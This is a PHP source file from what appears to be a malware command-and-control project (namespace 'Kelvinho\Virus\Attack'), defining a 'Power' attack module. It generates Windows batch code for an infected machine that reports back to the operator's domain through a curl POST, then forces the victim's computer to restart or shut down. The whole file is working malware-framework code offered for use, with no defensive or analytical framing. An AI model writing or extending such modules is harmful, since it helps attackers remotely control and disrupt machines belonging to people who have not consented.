<?php

namespace Kelvinho\Virus\Attack\Packages\Windows\OneTime;

use Kelvinho\Virus\Attack\AttackInterface;
use Kelvinho\Virus\Attack\BaseScriptWin;

class Power extends AttackInterface {
    public static int $POWER_SHUTDOWN = 1;
    public static int $POWER_RESTART = 0;
    private int $type;

    public function __construct() {
        parent::__construct();
        $this->type = self::$POWER_RESTART;
    }

    public function isShutdown(): bool {
        return $this->type == self::$POWER_SHUTDOWN;
    }

    public function setType(int $type): void {
        $this->type = $type;
    }

    /**
     * This will generate the intercept code that will be used to take the reported data back from the virus.
     */
    //@formatter:on
    public function generateIntercept(): string {
        ob_start(); ?>
        $attack = $attackFactory->get("<?php echo $this->attack_id; ?>");
        $attack->setExecuted();
        $attack->saveState();
        <?php return ob_get_clean();
    }
    //@formatter:off

    /**
     * This will restore the state of an attack with all of its configuration using a json string.
     *
     * @param string $json The JSON string
     */
    protected function setState(string $json): void {
        $state = json_decode($json, true);
        $this->type = $state["type"];
    }

    /**
     * This will get the state of an attack as a json string.
     *
     * @return string The JSON string
     */
    protected function getState(): string {
        $state = [];
        $state["type"] = $this->type;
        return json_encode($state);
    }

    private function generateUploadCode(): string {
        ob_start(); ?>
        curl -d "" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
        <?php return ob_get_clean();
    }

    /**
     * This is expected to call BaseScript::payloadConfirmationLoop() to generate the appropriate payload confirmation loop.
     *
     * @return string
     */
    //@formatter:off
    public function generateBatchCode(): string {
        ob_start();
        echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode()); ?>
        shutdown -<?php if ($this->type == self::$POWER_RESTART) {
            echo "r";
        } else {
            echo "s";
        } ?> -t 3
        <?php return ob_get_clean();
    }
    //@formatter:on

    /**
     * @inheritDoc
     */
    public function processExtras(string $resource): void {
    }
}